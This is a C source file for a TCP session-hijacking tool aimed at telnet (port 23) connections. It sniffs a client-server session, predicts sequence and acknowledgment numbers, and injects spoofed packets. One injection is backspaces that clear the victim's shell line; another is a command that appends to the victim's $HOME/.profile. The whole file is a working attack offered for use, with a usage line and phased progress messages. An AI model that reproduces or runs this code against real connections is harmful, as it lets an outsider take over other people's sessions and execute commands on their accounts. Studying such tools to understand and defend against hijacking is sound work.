#include "spoof.h"

#define INTERFACE		"eth0"  /* first ethernet device          */
#define INTERFACE_PREFIX	 14    	/* 14 bytes is an ethernet header */

#define PERSONAL_TOUCH		666

int fd_receive, fd_send;
char CLIENT[100],SERVER[100];
int CLIENT_P;

void main(int argc, char *argv[]) 
{ 
int i,j,count;
struct sp_wait_packet attack_info;
unsigned long sp_seq ,sp_ack; 
unsigned long old_seq ,old_ack; 
unsigned long serv_seq ,serv_ack; 

/* This data used to clean up the shell line */
char to_data[]={0x08, 0x08,0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x0a, 0x0a};
char evil_data[]="echo \"echo HACKED\" >>$HOME/.profile\n";

if(argc!=4)
	{
	printf("Usage: %s client client_port server\n",argv[0]);
	exit(1);
	}
strcpy(CLIENT,argv[1]);
CLIENT_P=atoi(argv[2]);
strcpy(SERVER,argv[3]);

/* preparing all necessary sockets (sending + receiving) */
DEV_PREFIX = INTERFACE_PREFIX;
fd_send = open_sending();                  
fd_receive = open_receiving(INTERFACE, 0);  /* normal BLOCKING mode */

printf("Starting Hijacking \n");
printf("------------------ \n");

for(j=0;j<50;j++)
  {
  printf("\nTakeover phase 1: Stealing connection.\n");
  wait_packet(fd_receive,&attack_info,CLIENT, CLIENT_P, SERVER, 23,ACK|PSH,0);
  sp_seq=attack_info.seq+attack_info.datalen; 
  sp_ack=attack_info.ack;
  printf("  Sending Spoofed clean-up data...\n");
  transmit_TCP(fd_send, to_data,0,0,sizeof(to_data),CLIENT, CLIENT_P, SERVER,23,
                                                      sp_seq,sp_ack,ACK|PSH);
/* NOTE: always beware you receive y'r OWN spoofed packs! */
/*       so handle it if necessary                         */
  count=0;
  printf("  Waiting for spoof to be confirmed...\n");
  while(count<5)
	{
    	wait_packet(fd_receive, &attack_info,SERVER,23,CLIENT,CLIENT_P,ACK,0);
    	if(attack_info.ack==sp_seq+sizeof(to_data))
		count=PERSONAL_TOUCH;
    	else count++;
    	};
  if(count!=PERSONAL_TOUCH)
    	{printf("Phase 1 unsuccesfully ended.\n");}
  else {printf("Phase 1 ended.\n"); break;};
  };

printf("\nTakeover phase 2: Getting on track with SEQ/ACK's again\n");
count=serv_seq=old_ack=0;
while(count<10)
	{
	old_seq=serv_seq;
	old_ack=serv_ack;
	wait_packet(fd_receive,&attack_info,SERVER, 23, CLIENT, CLIENT_P, ACK,0);
	if(attack_info.datalen==0)
	  {
	  serv_seq=attack_info.seq+attack_info.datalen;
	  serv_ack=attack_info.ack;
          if( (old_seq==serv_seq)&&(serv_ack==old_ack) )
		count=PERSONAL_TOUCH;
 	  else count++;
          }
    	};
if(count!=PERSONAL_TOUCH)
    	{printf("Phase 2 unsuccesfully ended.\n"); exit(0);}
printf("  Server SEQ: %X (hex)    ACK: %X (hex)\n",serv_seq,serv_ack);
printf("Phase 2 ended.\n");

printf("\nTakeover phase 3: Sending MY data.\n");
printf("  Sending evil data.\n");
transmit_TCP(fd_send, evil_data,0,0,sizeof(evil_data),CLIENT,CLIENT_P, 
	     SERVER,23,serv_ack,serv_seq,ACK|PSH);
count=0;
printf("  Waiting for evil data to be confirmed...\n");
while(count<5)
	{
    	wait_packet(fd_receive,&attack_info,SERVER,23,CLIENT,CLIENT_P,ACK,0);
    	if(attack_info.ack==serv_ack+sizeof(evil_data))
		count=PERSONAL_TOUCH;
    	else count++;
    	};
if(count!=PERSONAL_TOUCH)
    	{printf("Phase 3 unsuccesfully ended.\n"); exit(0);}
printf("Phase 3 ended.\n");

}

